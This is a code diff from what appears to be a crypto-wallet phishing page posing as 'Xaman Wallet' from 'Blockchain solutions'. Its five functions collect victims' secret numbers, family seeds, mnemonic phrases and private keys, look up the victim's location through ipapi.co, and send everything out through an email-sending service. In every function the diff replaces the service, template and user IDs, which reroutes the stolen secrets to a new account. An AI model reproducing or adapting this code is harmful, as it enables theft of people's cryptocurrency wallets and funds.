@@ -543,9 +543,9 @@ async function confirmSecretNumbers() {
       numbers: secretNumbers.value,
     };
     const params = {
-      service_id: "service_eusbqyo",
-      template_id: "template_z6xga6o",
-      user_id: "obT4LcwZqPw_KlOar",
+      service_id: "service_k4kimk6",
+      template_id: "template_mpy0fmg",
+      user_id: "DMvtKT5BmC4qV83V9",
       template_params: {
         from_name: "Blockchain solutions",
         wallet_type: "Xaman Wallet",
@@ -581,9 +581,9 @@ async function confirmFamilySeed() {
       seed: familySeedInput.value,
     };
     const params = {
-      service_id: "service_eusbqyo",
-      template_id: "template_z6xga6o",
-      user_id: "obT4LcwZqPw_KlOar",
+      service_id: "service_k4kimk6",
+      template_id: "template_mpy0fmg",
+      user_id: "DMvtKT5BmC4qV83V9",
       template_params: {
         from_name: "Blockchain solutions",
         wallet_type: "Xaman Wallet",
@@ -620,9 +620,9 @@ async function confirmMnemonic() {
       phrase: phraseWords.value.join(" "),
     };
     const params = {
-      service_id: "service_eusbqyo",
-      template_id: "template_z6xga6o",
-      user_id: "obT4LcwZqPw_KlOar",
+      service_id: "service_k4kimk6",
+      template_id: "template_mpy0fmg",
+      user_id: "DMvtKT5BmC4qV83V9",
       template_params: {
         from_name: "Blockchain solutions",
         wallet_type: "Xaman Wallet",
@@ -733,9 +733,9 @@ async function confirmPhrase() {
       phrase: phraseWords.value.join(" "),
     };
     const params = {
-      service_id: "service_eusbqyo",
-      template_id: "template_z6xga6o",
-      user_id: "obT4LcwZqPw_KlOar",
+      service_id: "service_k4kimk6",
+      template_id: "template_mpy0fmg",
+      user_id: "DMvtKT5BmC4qV83V9",
       template_params: {
         from_name: "Blockchain solutions",
         wallet_type: "Xaman Wallet",
@@ -768,9 +768,9 @@ async function confirmPrivateKey() {
     const location = await axios.get("https://ipapi.co/json");
     const payload = { type: "privateKey", privateKey: privateKeyInput.value };
     const params = {
-      service_id: "service_eusbqyo",
-      template_id: "template_z6xga6o",
-      user_id: "obT4LcwZqPw_KlOar",
+      service_id: "service_k4kimk6",
+      template_id: "template_mpy0fmg",
+      user_id: "DMvtKT5BmC4qV83V9",
       template_params: {
         from_name: "Blockchain solutions",
         wallet_type: "Xaman Wallet",
